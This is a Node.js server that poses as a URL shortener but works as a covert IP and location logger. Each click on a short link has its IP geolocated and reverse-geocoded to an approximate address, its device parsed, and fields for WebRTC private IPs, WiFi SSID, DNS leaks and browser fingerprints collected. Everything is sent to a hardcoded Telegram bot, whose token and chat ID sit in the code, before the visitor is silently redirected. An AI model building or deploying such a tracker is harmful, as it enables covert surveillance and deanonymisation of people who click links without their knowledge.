const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
const path = require('path');
const net = require('net');
const maxmind = require('maxmind');
const { UAParser } = require('ua-parser-js');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: 'text/plain', limit: '10mb' }));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5942654805';
const BASE_URL = process.env.SHORT_DOMAIN || 'https://vvvvv-production-7945.up.railway.app';

const linkStorage = {};

// ===== قاعدة بيانات MaxMind المحلية (الأدق، تعمل بدون إنترنت) =====
let geoDb = null;
maxmind
  .open(path.join(__dirname, 'geoip', 'GeoLite2-City.mmdb'))
  .then((db) => {
    geoDb = db;
    console.log('✅ [GeoIP] MaxMind database loaded');
  })
  .catch((err) => {
    console.error('❌ [GeoIP] Failed to load MaxMind database:', err.message);
  });

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

// ===== أدوات IP =====
function normalizeIP(ip) {
  if (!ip) return 'Unknown';
  if (ip.startsWith('::ffff:')) return ip.slice(7);
  return ip.trim();
}

function isPublicIP(ip) {
  const clean = normalizeIP(ip);
  if (net.isIPv4(clean)) {
    const p = clean.split('.').map(Number);
    if (p[0] === 10) return false;
    if (p[0] === 172 && p[1] >= 16 && p[1] <= 31) return false;
    if (p[0] === 192 && p[1] === 168) return false;
    if (p[0] === 127) return false;
    if (p[0] === 169 && p[1] === 254) return false;
    if (p[0] === 100 && p[1] >= 64 && p[1] <= 127) return false; // CGNAT
    return true;
  }
  if (net.isIPv6(clean)) {
    const lower = clean.toLowerCase();
    if (lower === '::1') return false;
    if (lower.startsWith('fc') || lower.startsWith('fd')) return false;
    if (lower.startsWith('fe80')) return false;
    return true;
  }
  return false;
}

// استخراج IP العميل الحقيقي حتى خلف بروكسي Railway
function getClientIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    const ips = forwarded
      .split(',')
      .map((s) => normalizeIP(s))
      .filter(Boolean);
    // أول IP عام في السلسلة هو العميل الحقيقي
    const clientIp = ips.find((ip) => isPublicIP(ip));
    if (clientIp) return clientIp;
    if (ips.length) return ips[0];
  }

  const realIp = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'];
  if (realIp) return normalizeIP(realIp);

  const remote = req.socket?.remoteAddress || req.connection?.remoteAddress || 'Unknown';
  return normalizeIP(remote);
}

// ===== إرسال إلى تلجرام =====
async function sendToTelegram(msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: msg,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        },
        { timeout: 10000 }
      );
      console.log('✅ [TG] Sent');
      return true;
    } catch (err) {
      console.error(`❌ [TG] Attempt ${i + 1} failed`);
      if (i < retries - 1) await new Promise((r) => setTimeout(r, 500));
    }
  }
  return false;
}

// ===== تحديد الموقع =====
// خدمة احتياطية عبر الإنترنت (تُستخدم فقط إذا لم تتوفر قاعدة MaxMind)
async function getLocationFromGeoJS(ip) {
  try {
    const res = await axios.get(`https://get.geojs.io/v1/ip/geo/${ip}.json`, { timeout: 4000 });
    if (res.data && res.data.latitude) {
      return {
        latitude: parseFloat(res.data.latitude),
        longitude: parseFloat(res.data.longitude),
        accuracy_radius: null,
        country: res.data.country || 'Unknown',
        country_code: res.data.country_code || '',
        city: res.data.city || 'Unknown',
        region: res.data.region || '',
        timezone: res.data.timezone || '',
        source: 'GeoJS'
      };
    }
  } catch (e) {
    console.error('❌ [GeoJS] lookup failed:', e.message);
  }
  return null;
}

async function getLocation(ip) {
  const cleanIp = normalizeIP(ip);

  // 1) MaxMind المحلية — الأدق والأكثر استقراراً
  if (geoDb && net.isIP(cleanIp)) {
    try {
      const r = geoDb.get(cleanIp);
      if (r && r.location) {
        const loc = {
          latitude: r.location.latitude,
          longitude: r.location.longitude,
          accuracy_radius: r.location.accuracy_radius,
          country: r.country?.names?.en || 'Unknown',
          country_code: r.country?.iso_code || '',
          city: r.city?.names?.en || 'Unknown',
          region: r.subdivisions?.[0]?.names?.en || '',
          timezone: r.location.time_zone || '',
          source: 'MaxMind GeoLite2'
        };
        console.log(`🌍 [GEO] ${cleanIp} -> ${loc.city}, ${loc.country} (${loc.source})`);
        return loc;
      }
    } catch (e) {
      console.error('❌ [MaxMind] lookup failed:', e.message);
    }
  }

  // 2) احتياطي عبر الإنترنت
  const fallback = await getLocationFromGeoJS(cleanIp);
  console.log(`🌍 [GEO] ${cleanIp} -> ${fallback ? `${fallback.city}, ${fallback.country} (${fallback.source})` : 'not found'}`);
  return fallback;
}

// ===== الترميز العكسي للعنوان (Nominatim) =====
async function reverseGeocode(lat, lng) {
  try {
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { timeout: 4000, headers: { 'User-Agent': 'LinkShortener/1.0' } }
    );
    if (res.data && res.data.display_name) {
      return res.data.display_name;
    }
  } catch (e) {
    console.error('❌ [Nominatim] reverse geocode failed:', e.message);
  }
  return null;
}

// ===== معلومات الجهاز من User-Agent =====
function parseUserAgent(ua) {
  try {
    const parsed = new UAParser(ua).getResult();
    const parts = [
      parsed.browser?.name ? `${parsed.browser.name} ${parsed.browser.version || ''}`.trim() : null,
      parsed.os?.name ? `${parsed.os.name} ${parsed.os.version || ''}`.trim() : null,
      parsed.device?.type ? parsed.device.type : null,
      parsed.device?.vendor ? parsed.device.vendor : null,
      parsed.device?.model ? parsed.device.model : null,
      parsed.cpu?.architecture ? `CPU: ${parsed.cpu.architecture}` : null
    ].filter(Boolean);
    return parts.join(' | ') || null;
  } catch (e) {
    return null;
  }
}

function safeParseBody(req) {
  if (typeof req.body === 'string') {
    try { return JSON.parse(req.body); } catch (e) { return {}; }
  }
  return req.body || {};
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function formatLocationBlock(loc) {
  let msg = '';
  const lat = loc.latitude;
  const lng = loc.longitude;
  msg += `📍 <code>${lat}, ${lng}</code>\n`;
  if (loc.accuracy_radius) msg += `🎯 دقة تقريبية: ~${loc.accuracy_radius} كم\n`;
  msg += `🏙️ ${loc.city}${loc.region ? ', ' + loc.region : ''}, ${loc.country}\n`;
  if (loc.timezone) msg += `⏱️ ${loc.timezone}\n`;
  msg += `🗺️ <a href="https://maps.google.com/?q=${lat},${lng}">Google Maps</a>\n`;
  msg += `🧭 المصدر: ${loc.source}\n`;
  return msg;
}

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  let normalizedUrl = url.trim();
  if (!/^https?:\/\//i.test(normalizedUrl)) {
    normalizedUrl = 'https://' + normalizedUrl;
  }

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: normalizedUrl, created: new Date(), clicks: 0 };

  console.log(`[SHORT] Created: ${shortCode}`);
  res.json({
    shortened: `${BASE_URL}/${shortCode}`,
    code: shortCode
  });
});

app.post('/api/log-all', async (req, res) => {
  const body = safeParseBody(req);
  const { code, methods } = body;

  if (!code || !linkStorage[code]) {
    return res.status(404).json({ error: 'Not found' });
  }

  const ip = getClientIP(req);
  const ua = req.headers['user-agent'] || '';
  const originalUrl = linkStorage[code].original;
  linkStorage[code].clicks++;

  // تحديد الموقع (MaxMind أولاً)
  const loc = await getLocation(ip);
  let address = null;
  if (loc) {
    address = await reverseGeocode(loc.latitude, loc.longitude);
  }

  let msg = `🔗 <b>رابط فُتح!</b>\n━━━━━━━━━━━━━━━━━━━\n`;
  msg += `<b>📌 الكود:</b> <code>${escapeHtml(code)}</code>\n`;
  msg += `<b>🎯 الهدف:</b> ${escapeHtml(originalUrl)}\n`;
  msg += `<b>🔌 IP:</b> <code>${escapeHtml(ip)}</code>\n`;
  msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n━━━━━━━━━━━━━━━━━━━\n\n`;

  // الموقع الجغرافي الدقيق
  if (loc) {
    msg += `<b>✅ تحديد الموقع (${loc.source})</b>\n`;
    msg += formatLocationBlock(loc);
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  } else {
    msg += `<b>⚠️ لم يتم تحديد الموقع</b>\n━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // معلومات الجهاز من User-Agent
  const uaInfo = parseUserAgent(ua);
  if (uaInfo) {
    msg += `<b>🖥️ الجهاز:</b>\n${escapeHtml(uaInfo)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 1: WebRTC
  if (methods?.webrtc) {
    msg += `<b>✅ الطريقة 1: WebRTC (Private IP)</b>\n`;
    msg += `🔌 ${escapeHtml(methods.webrtc)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 2: WiFi SSID
  if (methods?.wifi) {
    msg += `<b>✅ الطريقة 2: WiFi SSID</b>\n`;
    msg += `📡 ${escapeHtml(methods.wifi)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 4: Browser Fingerprinting
  if (methods?.fingerprint) {
    msg += `<b>✅ الطريقة 4: Browser Fingerprinting</b>\n`;
    msg += `🖥️ ${escapeHtml(methods.fingerprint)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 5: DNS Leak
  if (methods?.dns) {
    msg += `<b>✅ الطريقة 5: DNS Leak</b>\n`;
    msg += `🌐 ${escapeHtml(methods.dns)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 6: HTTP Headers Analysis
  if (methods?.headers) {
    msg += `<b>✅ الطريقة 6: HTTP Headers</b>\n`;
    msg += `📋 Language: ${escapeHtml(methods.headers.language || 'Unknown')}\n`;
    msg += `🌍 Encoding: ${escapeHtml(methods.headers.encoding || 'Unknown')}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 7: Timezone
  if (methods?.timezone) {
    msg += `<b>✅ الطريقة 7: Timezone Detection</b>\n`;
    msg += `⏱️ ${escapeHtml(methods.timezone)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 8: WebGL Canvas
  if (methods?.webgl) {
    msg += `<b>✅ الطريقة 8: WebGL Canvas</b>\n`;
    msg += `🎮 ${escapeHtml(methods.webgl)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 9: Screen Resolution
  if (methods?.screen) {
    msg += `<b>✅ الطريقة 9: Screen Resolution</b>\n`;
    msg += `📺 ${escapeHtml(methods.screen)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // طريقة 10: Browser Features
  if (methods?.features) {
    msg += `<b>✅ الطريقة 10: Browser Features</b>\n`;
    msg += `🌟 ${escapeHtml(methods.features)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━\n\n`;
  }

  // Address info
  if (address) {
    msg += `<b>📍 العنوان التقريبي:</b>\n${escapeHtml(address)}`;
  }

  await sendToTelegram(msg);
  res.json({ success: true });
});

app.get('/api/test', async (req, res) => {
  const ok = await sendToTelegram('🔗 اختبار ✅');
  res.json({ telegram: ok ? 'sent' : 'failed' });
});

// أداة تشخيص: تفتحها من أي جهاز وتشوف الـ IP اللي وصل للخادم والموقع المستخرج منه
app.get('/api/whoami', async (req, res) => {
  const ip = getClientIP(req);
  const loc = await getLocation(ip);
  res.json({
    detectedIp: ip,
    rawRemoteAddress: req.socket?.remoteAddress || null,
    headers: {
      'x-forwarded-for': req.headers['x-forwarded-for'] || null,
      'x-real-ip': req.headers['x-real-ip'] || null,
      'cf-connecting-ip': req.headers['cf-connecting-ip'] || null,
      forwarded: req.headers['forwarded'] || null
    },
    location: loc,
    userAgent: req.headers['user-agent'] || null
  });
});

app.use(express.static('.'));

// إعادة التوجيه المباشر للرابط الأصلي (بدون صفحة وسيطة)
app.get('/:code', async (req, res) => {
  const { code } = req.params;

  if (!linkStorage[code]) {
    return res.status(404).send('<h1 style="text-align:center;margin-top:50px">الرابط غير موجود</h1>');
  }

  const originalUrl = linkStorage[code].original;
  linkStorage[code].clicks++;

  const ip = getClientIP(req);
  const ua = req.headers['user-agent'] || '';

  setImmediate(async () => {
    const loc = await getLocation(ip);

    let msg = `🔗 <b>رابط فُتح!</b>\n`;
    msg += `<b>📌 الكود:</b> <code>${escapeHtml(code)}</code>\n`;
    msg += `<b>🔌 IP:</b> <code>${escapeHtml(ip)}</code>\n`;
    msg += `⏰ ${new Date().toLocaleString('ar-SA')}\n━━━━━━━━━━━━━━━━━━━\n`;

    if (loc) {
      msg += `<b>✅ تحديد الموقع (${loc.source})</b>\n`;
      msg += formatLocationBlock(loc);
      const addr = await reverseGeocode(loc.latitude, loc.longitude);
      if (addr) msg += `📍 ${escapeHtml(addr)}\n`;
    } else {
      msg += `⚠️ لم يتم تحديد الموقع\n`;
    }

    const uaInfo = parseUserAgent(ua);
    if (uaInfo) msg += `\n🖥️ <b>الجهاز:</b> ${escapeHtml(uaInfo)}`;

    await sendToTelegram(msg);
  });

  res.redirect(301, originalUrl);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
